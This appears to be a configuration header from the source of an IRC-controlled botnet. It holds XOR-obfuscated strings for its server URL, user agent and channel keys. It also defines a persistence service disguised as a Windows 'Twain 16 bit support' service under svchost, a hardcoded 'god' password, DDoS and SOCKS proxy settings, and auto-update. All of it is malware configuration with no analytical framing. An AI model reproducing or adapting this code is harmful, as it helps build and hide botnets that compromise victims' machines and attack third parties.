
/* confguration.cpp start */
#define XOR 0x13
char *decode_hex_string(char *coded);
/* confguration.cpp end */

/* auto update */
#ifdef FRELEASE
#define AUTO_UPDATE
#endif

#define DEBUG_PATH "c:\\tester.log"
/// HTTP LOGGING DEFINES
#define HTTP_LOG_RUNLOG D("61667D3D676B67")
#define HTTP_LOG_REGISTERLOG D("6176747A606776613D676B67")
#define HTTP_LOG_INFOLOG D("7A7D757C3D676B67")
#define HTTP_LOG_SOCKSLOG D("607C7078603D676B67")
#define HTTP_LOG_URL D("366C7B7C6B6A76757D786D3675767E376975")
#define HTTP_MAX_CONNECT_TRYES 100
#define HTTP_LOG_CONNECT_SLEEP 5000
/// HTTP DEFINES
#define HTTP_GET_BUF_SIZE 65535
#define HTTP_TIMEOUT 10
#define HTTP_USER_AGENT D("5E7C697A7F7F723C273D23333B707C7E6372677A717F7628335E405A5633253D232833447A7D777C6460335D4733263D222833767D3A")
#define HTTP_SECONDS_READ_TIMEOUT 50000
#define HTTP_NOT_FOUND 404
#define HTTP_FORBIDDEN 403

/// REGISTRY DEFINES
#define XOR_REGISTRY 13
#define TWAIN_KEY "SYSTEM\\CurrentControlSet\\Services\\Twain16\\Security"
/// DDOS DEFINES
#define RELEASE_SLEEP_DELAY 1000
/// MISC DEFINES 
#define PWD_XOR_KEY 13
#define EXPORT __declspec(dllexport)
#define MAX_LOG_MESSAGES 15
#define rtr ReadyToRead
#define PRESENCE_NAME D("6A7C717A61607C7F777267")
#define SOCKS_BUF_SIZE 65534
#define GOD_PASSWORD "DEE5B2E5DFEA3775FD5E8A7278D6F581\x00"
#define ENABLE 1
#define DISABLE 0
#define ERR 65000
#define ERR_MEMORY_ALLOC_FAILED 65001
#define SUCCESS 0
#define CONNECT_SLEEP 1500 /// delay between failed connects
#define MAX_SOCKET_TRYES 500 /// max tryes for socket-like functions ..
/// SERVICE INFORMATION
#define SVCHOST_PATH "%SystemRoot%\\System32\\svchost.exe -k netsvcs"
#define SERVICE_GROUP "netsvcs"
#define SERVICE_NAME "Twain16"
#define SERVICE_DISPNAME "Twain 16 bit support"
#define SERVICE_DESC "Communicates with twain resources and maintains 16 bit support for applications. If this service is stopped, some applications will not run correctly."
#define SERVICE_KEY	"System\\CurrentControlSet\\Services"
#define SVCHOST_KEY "Software\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost"
#define DLL_PATH D("36406A6067767E417C7C67364F6764727A7D4C22253D777F7F")
// IDENTD Service DEFINES
#define IDENTD_PORT 113
/// IRC DEFINES
#define MAX_CORE_SERVERS_CONNECT_TRYES 100
#define MAX_DUPLICATE_CHARS 40
#define IRC_NOTICE_TIMEOUT 1
#define IRC_MSG_TIMEOUT 1
#define CORE_IRC_PORT 65533
#define SECRET_IRC_KEY D("6066637661607C7F777267") /// hq channel key

#ifdef FRELEASE
#define IRC_CHANNEL D("6522") /// hq channel
#else
#define IRC_CHANNEL D("7D667876707C7F72") /* debug channel */
#endif

#define IRC_NICK_PREFIX "X3-" /// name prefix for identification
#define IRC_MAX_READ_TIMEOUT 3
#define IRC_RECVBUF_SIZE 65534
#define IRC_OUTBUF_SIZE 65534
#define IRC_REALNAME D("66717661607C7F777267")
#define INTERNAL_TEMP_BUF 65534
#define SEND_MSG_DIRECT 1
#define IRC_MSG_DELAY 1500 /// 1/2 sec msgs
#define IRC_NICK_LEN 10
#define SEND_MSG_TO_RECIEVER 2
#define IRC_PING_DELAY_SECONDS 120
#define IRC_PING_AWAIT_SECONDS 20
#define IRC_CTCP_VERSION D("7E5A41503365253D232033587B727F7677335E726177727E3E51766A")
